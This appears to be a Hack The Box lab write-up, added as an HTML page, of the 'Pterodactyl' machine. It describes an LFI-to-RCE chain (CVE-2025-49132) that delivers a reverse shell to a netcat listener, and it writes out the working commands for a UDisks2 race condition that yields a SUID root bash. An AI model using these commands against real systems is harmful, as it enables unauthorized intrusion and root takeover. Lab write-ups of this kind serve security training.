@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pterodactyl HTB Writeup - From RCE to Root</title>
+    <style>
+        :root {
+            --bg-color: #0a0e17; /* Very Dark Navy */
+            --container-bg: #121826; /* Dark Purple-Gray */
+            --accent-primary: #8a2be2; /* BlueViolet */
+            --accent-secondary: #ba55d3; /* MediumOrchid */
+            --text-main: #e6edf3;
+            --text-muted: #8b949e;
+            --code-bg: rgba(138, 43, 226, 0.15); /* Subtle purple behind code */
+            --pre-bg: #010409;
+            --border-color: #30363d;
+            --success-color: #3fb950;
+            --highlight-color: #ff7b72;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
+            line-height: 1.6;
+            color: var(--text-main);
+            /* SERIOUS PURPLE BACKGROUND GRADE */
+            background-color: var(--bg-color);
+            background-image: 
+                radial-gradient(at 10% 10%, rgba(138, 43, 226, 0.15) 0px, transparent 50%),
+                radial-gradient(at 90% 90%, rgba(75, 0, 130, 0.15) 0px, transparent 50%);
+            background-attachment: fixed;
+            max-width: 950px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .container {
+            background-color: var(--container-bg);
+            padding: 40px;
+            border-radius: 12px;
+            border: 1px solid rgba(138, 43, 226, 0.2);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            backdrop-filter: blur(5px);
+        }
+
+        h1 {
+            color: var(--accent-primary);
+            font-size: 2.5em;
+            border-bottom: 2px solid rgba(138, 43, 226, 0.3);
+            padding-bottom: 15px;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px rgba(138, 43, 226, 0.5);
+        }
+
+        h2, h3 {
+            color: var(--accent-secondary);
+            margin-top: 35px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 8px;
+        }
+
+        p { margin: 15px 0; }
+
+        code {
+            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+            background-color: var(--code-bg);
+            padding: 0.3em 0.5em;
+            border-radius: 6px;
+            font-size: 85%;
+            color: var(--accent-secondary);
+            border: 1px solid rgba(138, 43, 226, 0.1);
+        }
+
+        pre {
+            background-color: var(--pre-bg);
+            padding: 18px;
+            overflow: auto;
+            border-radius: 8px;
+            border: 1px solid rgba(138, 43, 226, 0.2);
+            line-height: 1.5;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
+        }
+
+        pre code {
+            background-color: transparent;
+            padding: 0;
+            color: #e6edf3;
+            font-size: 90%;
+            border: none;
+        }
+
+        .highlight { color: var(--highlight-color); }
+        .success { color: var(--success-color); font-weight: bold; }
+        .comment { color: var(--text-muted); font-style: italic; }
+
+        .info {
+            border-left: 4px solid var(--accent-primary);
+            padding: 15px 20px;
+            background: rgba(138, 43, 226, 0.05);
+            margin: 25px 0;
+            border-radius: 0 8px 8px 0;
+            color: var(--text-muted);
+        }
+
+        .header-meta {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tag-group { display: flex; gap: 10px; }
+
+        .tag {
+            display: inline-block;
+            padding: 3px 15px;
+            background-color: rgba(138, 43, 226, 0.2);
+            color: var(--accent-secondary);
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: bold;
+            border: 1px solid rgba(138, 43, 226, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .tag.difficulty {
+            background-color: #238636; /* Green for Medium */
+            color: white;
+            border: none;
+        }
+
+        hr {
+            border: 0;
+            border-top: 1px solid var(--border-color);
+            margin: 30px 0;
+        }
+
+        ul { margin-left: 20px; }
+        li { margin-bottom: 8px; }
+
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header-meta">
+        <div class="tag-group">
+            <span class="tag">HTB</span>
+            <span class="tag difficulty">Medium</span>
+        </div>
+        <span style="color: var(--text-muted); font-size: 14px;">Author: Diamondandres96</span>
+    </div>
+
+    <h1>Pterodactyl - From Remote Access to Root Control</h1>
+    
+    <p><strong>Description:</strong> A comprehensive walkthrough detailing the chain from a critical RCE vulnerability (CVE-2025-49132) on a management panel to a sophisticated UDisks2 Race Condition for full Root access.</p>
+
+    <hr>
+
+    <h2>1. Initial Access: The Pterodactyl Panel RCE (CVE-2025-49132)</h2>
+    <p>Our reconnaissance revealed that the target's management panel, <strong>Pterodactyl</strong>, was running an outdated version (&lt; 1.11.11). This specific version is critical due to a flaw in its locale management that enables Local File Inclusion (LFI). This LFI can be leveraged to trigger the <code>pearcmd</code> tool, achieving Remote Code Execution.</p>
+    
+    <h3>Attack Flow:</h3>
+    <ul>
+        <li><strong>Poisoning:</strong> Abuse the LFI to create a malicious PHP file: <code>/tmp/payload.php</code>.</li>
+        <li><strong>Payload:</strong> We inject a dynamic Base64-encoded Bash reverse shell into the PHP file using the <code>system()</code> function.</li>
+        <li><strong>Execution:</strong> Perform a second request via the LFI to include and execute the newly created temporary payload.</li>
+    </ul>
+
+    <pre><code><span class="comment"># Terminal 1 (Setup Listener)</span>
+nc -lvnp 4444
+
+<span class="comment"># Terminal 2 (Execute Exploit)</span>
+python3 exp.py -t panel.pterodactyl.htb -l [YOUR_VPN_TUN0_IP] -p 4444
+
+<span class="comment"># PoC Output:</span>
+[*] Target: panel.pterodactyl.htb
+[*] LHOST: 10.10.14.57 (adjust to yours)
+[*] Uploading payload via pearcmd...
+<span class="success">[+] Locale poison successful: /tmp/payload.php created.</span>
+[*] Triggering payload... check Terminal 1!</code></pre>
+
+    <p>After upgrading our newly obtained shell, we pivot from the web user to the machine's actual user, <code>phileasfogg3</code>.</p>
+
+    <h2>2. Privilege Escalation: Exploiting the UDisks2 Race Condition</h2>
+    <p>Enumeration inside the system as <code>phileasfogg3</code> identified **UDisks2**, a system service that allows unprivileged users to manage storage devices. A significant vulnerability exists during filesystem resizing operations (specifically XFS): a small time window occurs where UDisks mounts the device with permissive permissions.</p>
+
+    <h3>Setup & Preparation:</h3>
+    <pre><code><span class="comment"># Step 1: Force an active session state by mimicking PAM variables.</span>
+<span class="comment"># UDisksctl requires an active session detected by logind.</span>
+echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment
+exit <span class="comment"># Re-connect via SSH</span>
+
+<span class="comment"># Verify active session state</span>
+loginctl show-session $(loginctl | grep $(whoami) | awk '{print $1}') | grep Active
+<span class="success">Active=yes</span></code></pre>
+
+    <h3>The Exploitation Window:</h3>
+    <p>We prepare a specialized XFS image (<code>xfs.img</code>) containing a SUID-enabled <code>bash</code> binary. We transfer this image to the victim's <code>/tmp</code>.</p>
+
+    <pre><code><span class="comment"># Step A: Map the malicious XFS image as a loop device</span>
+udisksctl loop-setup -f /tmp/xfs.img
+<span class="comment"># Output: Mapped file /tmp/xfs.img as /dev/loop0</span>
+
+<span class="comment"># Step B: Launch the "Catcher" (or Sniper) in the background.</span>
+<span class="comment"># This aggressive loop immediately finds the temporary mount point and</span>
+<span class="comment"># executes the SUID bash inside it to create a persistent root shell.</span>
+(while true; do ls -d /tmp/blockdev.* 2>/dev/null | while read d; do "$d"/bash -p -c 'cp /usr/bin/bash /tmp/rb; chmod 4755 /tmp/rb' 2>/dev/null; done; done) &
+
+<span class="comment"># Step C: Trigger the UDisks2 vulnerability via DBus.</span>
+<span class="comment"># This call forces UDisks to mount the malicious device briefly to resize it.</span>
+busctl call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/block_devices/loop0 \
+org.freedesktop.UDisks2.Filesystem Resize "ta{sv}" 0 0</code></pre>
+
+    <div class="info">
+        <strong style="color: var(--accent-secondary)">Race Condition Explained:</strong> The attack relies on winning a "race." When <code>busctl</code> triggers the resize, UDisks2 mounts the XFS image under <code>/tmp/blockdev.XXXXXX</code>. Our background loop ("Step B") must execute the internal SUID shell during the brief moment *after* the mount occurs but *before* the operation completes and UDisks removes the directory.
+    </div>
+
+    <h2>3. Victory (Root Flag Retrieval)</h2>
+    <p>Winning the race results in a persistent root binary located at <code>/tmp/rb</code>, owned by root with the SUID bit set.</p>
+
+    <pre><code>phileasfogg3@pterodactyl:/tmp> <span class="highlight">./rb -p</span>
+rb-4.4# <span class="highlight">id</span>
+uid=1002(phileasfogg3) gid=100(users) <span class="success">euid=0(root)</span>
+rb-4.4# <span class="highlight">cat /root/root.txt</span>
+<span class="comment">################################</span> <span class="comment">// Redacted: Get the flag yourself!</span>
+rb-4.4# <span class="highlight">pwd</span>
+/root</code></pre>
+
+    <hr>
+    <p style="text-align: center; color: var(--text-muted); font-size: 14px;">
+        &copy; 2026 Diamondandres96 - Cybersecurity Writeups
+    </p>
+</div>
+
+</body>
+</html>
